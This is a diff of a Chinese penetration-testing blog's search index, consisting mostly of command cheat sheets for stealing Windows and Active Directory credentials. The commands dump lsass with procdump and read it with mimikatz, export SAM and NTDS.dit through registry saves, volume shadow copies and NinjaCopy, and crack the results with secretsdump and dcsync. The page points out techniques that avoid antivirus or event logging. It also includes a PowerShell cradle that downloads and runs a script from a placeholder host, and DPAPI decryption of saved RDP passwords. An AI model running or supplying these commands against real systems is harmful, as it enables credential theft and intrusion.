-<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Pwddump7</span>.</span></span>exe &gt; pass.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.png"></p>
+<h5 id="非交互式-1"><a href="#非交互式-1" class="headerlink" title="非交互式:"></a>非交互式:</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ntdsutil <span class="string">&quot;activate instance ntds&quot;</span> ifm “create full C:\ntds” quit quit</span><br></pre></td></tr></table></figure>
 
-<p>得到</p>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/2.jpg"></p>
-<h4 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h4><blockquote>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
-</blockquote>
-<p>Procdump lsass 进程导出: </p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> <span class="number">32</span>bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line"><span class="keyword">For</span> <span class="number">64</span>bits：</span><br><span class="line">procdump.exe -accepteula -<span class="number">64</span> -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
 
-<p>然后使用mimikatz还原密码：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">sekurlsa::<span class="title">minidump</span> <span class="title">lsass.dmp</span></span></span><br><span class="line"><span class="function"><span class="title">sekurlsa</span>::<span class="title">logonPasswords</span> <span class="title">full</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
 
-<h4 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h4><blockquote>
-<p><a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdum</a></p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure>
+<h4 id="Vssadmin"><a href="#Vssadmin" class="headerlink" title="Vssadmin"></a>Vssadmin</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows										//查询当前系统的快照</span><br><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:									//创建快照</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\ntds2.dit		//复制文件</span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quiet								//删除快照</span><br><span class="line">vssadmin delete Shadows /All /quie								//删除快照</span><br></pre></td></tr></table></figure>
 
-<h6 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line"><span class="function">lsadump::<span class="title">sam</span> /<span class="title">system:system</span>.<span class="title">hiv</span> /<span class="title">sam:sam</span>.<span class="title">hiv</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.png"></p>
+<h5 id="mklink"><a href="#mklink" class="headerlink" title="mklink"></a>mklink</h5><p>无法直接访问 \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy23中的文件 </p>
+<p>可通过创建符号链接访问快照中的文件： </p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mklink /d c:\test\ \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy23\</span><br><span class="line"><span class="built_in">rd</span> c:\testvsc</span><br></pre></td></tr></table></figure>
 
-<h6 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure>
 
-<h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><blockquote>
-<p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
-</blockquote>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/3.jpg"></p>
-<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><h6 id="Hashdump"><a href="#Hashdump" class="headerlink" title="Hashdump"></a>Hashdump</h6><p>获取system权限</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">meterpreter</span> &gt; getsystem</span><br><span class="line">meterpreter &gt; getuid</span><br></pre></td></tr></table></figure>
 
-<p>获取hash值</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump		//system权限的meterpreter</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit						//结果保存在tmp目录下</span><br></pre></td></tr></table></figure>
+<h4 id="Vshadow"><a href="#Vshadow" class="headerlink" title="Vshadow"></a>Vshadow</h4><p>Vshadow：是一个简单的指令行工具，它允许任何人创建卷影拷贝。系统默认不支持，可在<code>Microsoft Windows Software Development Kit (SDK)</code>中获得该工具。（不会被杀软杀）</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">vshadow.exe <span class="literal">-q</span>								//查询当前快照</span><br><span class="line">vshadow.exe <span class="literal">-p</span> <span class="literal">-nw</span> C:							//创建快照</span><br><span class="line"><span class="built_in">copy</span> [<span class="type">Shadow</span> <span class="type">copy</span> <span class="type">device</span> <span class="type">name</span>]\windows\ntds\ntds.dit c:\ntds.dit	//复制</span><br><span class="line">vshadow.exe <span class="literal">-dx</span>=ShadowCopySetId						//删除</span><br><span class="line">vshadow.exe <span class="literal">-ds</span>=ShadowCopyId</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<h5 id="查询快照"><a href="#查询快照" class="headerlink" title="查询快照"></a>查询快照</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.png"></p>
+<h5 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.png"></p>
+<h5 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h5><p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.png"></p>
+<h4 id="NinjaCopy"><a href="#NinjaCopy" class="headerlink" title="NinjaCopy"></a>NinjaCopy</h4><p>通过NinjaCopy获得域控服务器NTDS.dit文件,没有调用Volume Shadow Copy服务，所以不会产生日志文件7036。</p>
+<h5 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set-executionpolicy</span> Bypass			//修改powershell执行策略</span><br></pre></td></tr></table></figure>
 
-<h6 id="Mimikatz-2"><a href="#Mimikatz-2" class="headerlink" title="Mimikatz"></a>Mimikatz</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; <span class="built_in">help</span> kiwi</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\<span class="built_in">invoke-NinjaCopy</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> .\sam.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> .\system.hive</span><br><span class="line"><span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\windows\ntds\ntds.dit <span class="literal">-LocalDestination</span> .\ntds.dit</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#列举系统中的明文密码</span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">#读取sam文件</span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line">#kiwi_cmd命令后面接mimikatz.exe的命令</span><br><span class="line">meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.png"></p>
+<h5 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> C:\Users\<span class="number">4600</span>\Desktop\<span class="built_in">Invoke-NinjaCopy</span>.ps1</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam.hive</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span></span><br><span class="line">c:\system.hive</span><br><span class="line">powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> C:\ntds.dit</span><br></pre></td></tr></table></figure>
 
-<h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+<h5 id="远程加载"><a href="#远程加载" class="headerlink" title="远程加载"></a>远程加载</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SAM <span class="literal">-LocalDestination</span> c:\sam1.hive</span><br><span class="line"></span><br><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> c:\system1.hive</span><br><span class="line"></span><br><span class="line">powershell.exe <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://ip:port/InvokeNinjaCopy.ps1&#x27;</span>);<span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\ntds\ntds.dit <span class="literal">-LocalDestination</span> c:\ntds1.dit</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x02-Hash解密"><a href="#0x02-Hash解密" class="headerlink" title="0x02  Hash解密"></a>0x02  Hash解密</h3><blockquote>
-<p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
-</blockquote>
-<h6 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h6><p>如果网站无法破解出hash值，可以使用ophcrack工具配合彩虹表破解。 </p>
-<p>工具下载：<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a> </p>
-<p>彩虹表： <a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a> <a href="http://project-rainbowcrack.com/table.htm">http://project-rainbowcrack.com/table.htm</a></p>
-<h3 id="0x03-其他密码获取"><a href="#0x03-其他密码获取" class="headerlink" title="0x03  其他密码获取"></a>0x03  其他密码获取</h3><h4 id="获取RDP连接密码"><a href="#获取RDP连接密码" class="headerlink" title="获取RDP连接密码"></a>获取RDP连接密码</h4><h6 id="获取链接记录"><a href="#获取链接记录" class="headerlink" title="获取链接记录"></a>获取链接记录</h6><blockquote>
-<p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p>
-</blockquote>
-<h6 id="mimikatz解密"><a href="#mimikatz解密" class="headerlink" title="mimikatz解密"></a>mimikatz解密</h6><p>查看本地机器本地连接过的目标机器：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/4.jpg"></p>
-<p>查看本地用户此目录下是否存有RDP密码文件：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a <span class="variable">%userprofile%</span>\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/5.jpg"></p>
-<p>查看保存在本地的远程主机信息：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-解密ntds-dit"><a href="#0x02-解密ntds-dit" class="headerlink" title="0x02 解密ntds.dit"></a>0x02 解密ntds.dit</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">esentutl /p /o ntds.dit			//修复复制出来的数据库文件</span><br></pre></td></tr></table></figure>
 
-<p>选择一个密码文件对其进行解密：</p>
-<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\D</span>FBE70A7E5CC19A398EBF1B96859CE5D</span><br></pre></td></tr></table></figure>
+<h4 id="QuarkPwDump"><a href="#QuarkPwDump" class="headerlink" title="QuarkPwDump"></a>QuarkPwDump</h4><p>Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的 用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">QuarksPwDump.exe -<span class="literal">-dump</span><span class="literal">-hash</span><span class="literal">-domain</span> -<span class="literal">-output</span> de1ay.com.txt -<span class="literal">-ntds</span><span class="operator">-file</span> ntds.dit</span><br></pre></td></tr></table></figure>
 
-<p>此处需要记录下<code>guidMasterKey</code>的值，待会要通过<code>guidMasterKey</code>找对应的<code>Masterkey</code>。</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">guidMasterKey : &#123;<span class="number">56</span>dc62ge-<span class="number">0</span>af9-<span class="number">4925</span>-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/8.png"></p>
+<h4 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h4><p>impacket 套件中的 secretsdump.py 脚本解密，速度有点慢</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">secretsdump.exe <span class="literal">-sam</span> sam.hive <span class="literal">-security</span> security.hive <span class="literal">-system</span> system.hive LOCAL</span><br><span class="line">secretsdump.exe <span class="literal">-system</span> system.hive <span class="literal">-ntds</span> ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
 
-<p>根据guidMasterKey找到对应的Masterkey：</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/9.png"></p>
+<h4 id="NtdsAudit"><a href="#NtdsAudit" class="headerlink" title="NtdsAudit"></a>NtdsAudit</h4><p>NtdsAudit可以十分高效的破解ntds文件并将全部域用户信息导出方便查找域用户状态。 将ntds.dit文件和SYSTEM文件放在同一目录下执行命令</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">NtdsAudit.exe <span class="string">&quot;ntds.dit&quot;</span> <span class="literal">-s</span> <span class="string">&quot;system.hive&quot;</span> <span class="literal">-p</span> pwdump.txt -<span class="literal">-users</span><span class="literal">-csv</span> users.csv</span><br></pre></td></tr></table></figure>
 
-<p>通过Masterkey解密pbData数据，拿到明文RDP连接密码：</p>
-<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">dpapi::cred</span><br><span class="line">/in:C:<span class="symbol">\U</span>sers<span class="symbol">\4</span>600<span class="symbol">\A</span>ppData<span class="symbol">\L</span>ocal<span class="symbol">\M</span>icrosoft<span class="symbol">\C</span>redentials<span class="symbol">\2</span>A203AFB09B575A760E88FA341B9E354</span><br><span class="line">/masterkey:2d72835b9c08a9332106c23017ee6c0a0be9a368de34c1f6acc6d34dc0de8bc264729bd7736</span><br><span class="line">f806e9456544841564be0d5e9564090a7bb143ac32579adabb02a</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/10.png"></p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>使用Mimikatz的<code>dcsync</code>功能，可以利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:de1ay.com /user:mssql			//获取单个用户的详细信息</span><br><span class="line">lsadump::dcsync /domain:de1ay.com /all /cvs			//获取所有用户</span><br><span class="line">mimikatz lsadump::lsa /inject					//查看所有用户的详细信息</span><br></pre></td></tr></table></figure>
 
-<h4 id="Mysql数据库密码破解"><a href="#Mysql数据库密码破解" class="headerlink" title="Mysql数据库密码破解"></a>Mysql数据库密码破解</h4><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问 数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。 </p>
-<p>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权 限后即可直接从数据库连接文件中读取 一般都包含有数据库类型，物理位置，用户名和密码等信息</p>
-<h5 id="MYSQL数据库文件类型"><a href="#MYSQL数据库文件类型" class="headerlink" title="MYSQL数据库文件类型"></a>MYSQL数据库文件类型</h5><p>MYSQL数据库文件共有“frm”、“MYD”“和MYI”三种文件</p>
-<ul>
-<li>“.frm” 是描述表结构的文件 </li>
-<li>“.MYD” 是表的数据文件 </li>
-<li>“.MYI” 是表数据文件中任何索引的数据树</li>
-</ul>
-<p>与用户相关的一共有三个文件即user.frm、user.MYD、user.MYI，MYSQL数据库用户密码都保存在user.MYD 文件中，包括root用户和其他用户的密码</p>
-<h5 id="MYSQL加密方式"><a href="#MYSQL加密方式" class="headerlink" title="MYSQL加密方式"></a>MYSQL加密方式</h5><p>MYSQL数据库的认证密码有两种方式：</p>
-<ul>
-<li>MYSQL 4.1版本之前是MYSQL323加密 </li>
-<li>MYSQL 4.1和之后的版本都是MYSQLSHA1加密</li>
-</ul>
-<p>MYSQL数据库中自带Old_Password（str）和Password（str）函数,它们均可以在MYSQL数据库里进行查询， 前者是MYSQL323加密，后者是MYSQLSHA1方式加密。 MYSQL323加密中生成的是16位字符串，而在MYSQLSHA1中生存的是41位字符串，其中*是不加入实际的密 码运算中，MYSQLSHA1加密的密码的实际位数是40位</p>
-<h5 id="获取MYSQL密码"><a href="#获取MYSQL密码" class="headerlink" title="获取MYSQL密码"></a>获取MYSQL密码</h5><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p>
-<p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/6.jpg"></p>
-<h5 id="Hash破解"><a href="#Hash破解" class="headerlink" title="Hash破解"></a>Hash破解</h5><ul>
-<li><a href="http://www.cmd5.com/">www.cmd5.com</a> </li>
-<li><a href="http://www.somd5.com/">www.somd5.com</a></li>
-</ul>
-<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h6 id="SharpDecryptPwd"><a href="#SharpDecryptPwd" class="headerlink" title="SharpDecryptPwd"></a>SharpDecryptPwd</h6><p><img src="/2021/03/04/Windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/7.jpg"></p>
+<p><img src="/2021/02/28/%E5%9F%9F%E5%86%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/11.png"></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -1109,154 +1257,6 @@ M1001 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">�
 <h6 id="保存混淆之后的脚本："><a href="#保存混淆之后的脚本：" class="headerlink" title="保存混淆之后的脚本："></a>保存混淆之后的脚本：</h6><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">out p.ps1</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/05/04/Window%E5%8F%8D%E5%BC%B9Shell/19.png"></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用burp进行暴力破解</title>
-    <url>/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<h3 id="成殇Orz1"><a href="#成殇Orz1" class="headerlink" title="成殇Orz1"></a>成殇Orz1</h3><h3 id="0x00-Burp的工作模式"><a href="#0x00-Burp的工作模式" class="headerlink" title="0x00 Burp的工作模式"></a>0x00 <strong>Burp的工作模式</strong></h3><p>​    在没有burp之前，客户端使用浏览器直接与服务器进行通信。有了burp之后，burp在客户端与服务器之间充当代理。这样，浏览器发送给服务器的请求就会被burp进行捕获，而burp和wireshark这种审计类工具相比，其强大之处在于不仅可以做审计工作，更可以对数据包进行修改并发送出去。使用了burp的结构如下图所示。</p>
-<span id="more"></span>
-
-<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1.png"></p>
-<h3 id="0X01-暴力破解"><a href="#0X01-暴力破解" class="headerlink" title="0X01 暴力破解"></a>0X01 <strong>暴力破解</strong></h3><p>​    一般使用暴力破解都有两种原因：</p>
-<ol>
-<li><p>对这个漏洞的测试，人是可以完成的，即可穷举。</p>
-</li>
-<li><p>人可以完成，但是代价太大，或者太浪费时间。</p>
-<p>正是出于这样的问题，一些软件的出现帮助人完成了这些测试，这就是暴力破解的真正好处。在业界曾经有这样的一种看法，对于暴力破解的使用都不屑一          顾，因为大家觉得技术含量太低。但是，从实际的情况来看，因为用户使用弱口令情况太普遍，导致很多漏洞使用暴力破解都可以轻松拿下。</p>
-<p>暴力破解，最有价值的地方是在对字典的构造上，这是一门技术，需要长期的经验积累。</p>
-</li>
-</ol>
-<h3 id="0x02-Burp-Suite代理和浏览器设置"><a href="#0x02-Burp-Suite代理和浏览器设置" class="headerlink" title="0x02 Burp Suite代理和浏览器设置"></a>0x02 Burp Suite代理和浏览器设置</h3><p>​    当Burp Suite 启动之后，默认分配的代理地址和端口是127.0.0.1 ：8080,可以从Burp Suite的proxy选项卡的options上查看。</p>
-<p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.png"></p>
-<h4 id="1-IE设置"><a href="#1-IE设置" class="headerlink" title="1. IE设置"></a>1. IE设置</h4><h5 id="1-启动IE浏览器"><a href="#1-启动IE浏览器" class="headerlink" title="(1)  启动IE浏览器"></a>(1)  启动IE浏览器</h5><h5 id="2-点击【工具】菜单，选择【Internet】选项"><a href="#2-点击【工具】菜单，选择【Internet】选项" class="headerlink" title="(2)  点击【工具】菜单，选择【Internet】选项"></a>(2)  点击【工具】菜单，选择【Internet】选项</h5><h5 id="3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。"><a href="#3-打开【连接】选项卡，点击【局域网设置】，进行代理设置。" class="headerlink" title="(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。"></a>(3)  打开【连接】选项卡，点击【局域网设置】，进行代理设置。</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.png"></p>
-<h5 id="4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置"><a href="#4-在代理服务器设置的地址输入框中填写127-0-0-1-端口填写8080，点击【确定】，完成代理服务器的设置" class="headerlink" title="(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置"></a>(4)  在代理服务器设置的地址输入框中填写127.0.0.1,端口填写8080，点击【确定】，完成代理服务器的设置</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.png"></p>
-<h5 id="5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面"><a href="#5-这时，IE的设置已经完成，你可以访问-http-burp-将会看到Burp-Suite的欢迎界面" class="headerlink" title="(5)  这时，IE的设置已经完成，你可以访问 http://burp 将会看到Burp Suite的欢迎界面"></a>(5)  这时，IE的设置已经完成，你可以访问 <a href="http://burp/">http://burp</a> 将会看到Burp Suite的欢迎界面</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.png"></p>
-<h4 id="2-FireFox设置"><a href="#2-FireFox设置" class="headerlink" title="2. FireFox设置"></a>2. FireFox设置</h4><p>​    与IE的设置类似，在FireFox中，我们也要进行一些参数设置，才能将FireFox浏览器的通信流量，通过Burp Suite代理进行传输。详细的步骤如下：</p>
-<h5 id="1-启动FireFox浏览器，点击【工具】菜单，点击【选项】"><a href="#1-启动FireFox浏览器，点击【工具】菜单，点击【选项】" class="headerlink" title="(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】"></a>(1)  启动FireFox浏览器，点击【工具】菜单，点击【选项】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.png"></p>
-<h5 id="2-依次点击【高级】-【网络】【设置】"><a href="#2-依次点击【高级】-【网络】【设置】" class="headerlink" title="(2)    依次点击【高级】 【网络】【设置】"></a>(2)    依次点击【高级】 【网络】【设置】</h5><p><img src="/2021/02/21/%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.png"></p>
